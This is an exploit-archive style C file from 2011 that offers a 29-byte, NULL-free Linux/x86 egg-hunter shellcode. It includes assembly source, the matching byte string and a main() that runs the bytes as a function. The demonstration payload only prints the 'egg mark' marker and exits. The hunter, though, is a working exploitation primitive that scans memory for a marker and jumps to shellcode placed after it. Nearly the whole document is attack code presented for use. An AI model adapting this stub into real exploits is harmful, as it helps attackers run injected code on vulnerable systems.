/*
Exploit Title: Linux/x86 egghunt shellcode 29 bytes NULL free
Date: 23-07-2011
Author: Ali Raheem
Tested on:
Linux Ali-PC.home 2.6.38.8-35.fc15.x86_64 #1 SMP Wed Jul 6 13:58:54 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
Linux injustice 2.6.38-10-generic #46-Ubuntu SMP Tue Jun 28 15:05:41 UTC 2011 i686 i686 i386 GNU/Linux
http://codepad.org/2yMrNY5L Code pad lets you execute code live check here for a live demostration
Thanks: Stealth- for testing and codepad.com for being so useful.
section .data
	msg     db "We found the egg!",0ah,0dh
        msg_len equ $-msg
        egg     equ "egg "
        egg1    equ "mark"
section .text
	global  _start
_start:
       	jmp     _return
_continue:
	pop     eax             ;This can point anywhere valid
_next:
      	inc     eax		;change to dec if you want to search backwards
_isEgg:
       	cmp     dword [eax-8],egg
        jne     _next
        cmp     dword [eax-4],egg1
        jne     _next
        jmp     eax
_return:
        call    _continue
_egg:
     	db	"egg mark"              ;QWORD egg marker
        sub     eax,8
        mov     ecx,eax
        mov     edx,8
        mov     eax,4
        mov     ebx,1
        int     80h
        mov     eax,1
        mov     ebx,0
        int     80h
*/
char hunter[] =
"\xeb\x16"
"\x58"
"\x40" /* \x40 = inc eax, \x48 = dec eax try both*/
"\x81\x78\xf8\x65\x67\x67\x20"
"\x75\xf6"
"\x81\x78\xfc\x6d\x61\x72\x6b"
"\x75\xed"
"\xff\xe0"
"\xe8\xe5\xff\xff\xff";

char egg[] =
"egg mark" /* The rest of this is the shellcode you want found*/
"\x83\xe8\x08" /*This shellcode prints eax-4 i.e. the egg mark*/
"\x89\xc1"
"\xba\x08\x00\x00\x00"
"\xb8\x04\x00\x00\x00"
"\xbb\x01\x00\x00\x00"
"\xcd\x80"
"\xb8\x01\x00\x00\x00"
"\xbb\x00\x00\x00\x00"
"\xcd\x80";

int main(){
     (*(void  (*)()) hunter)();
     return 0;
}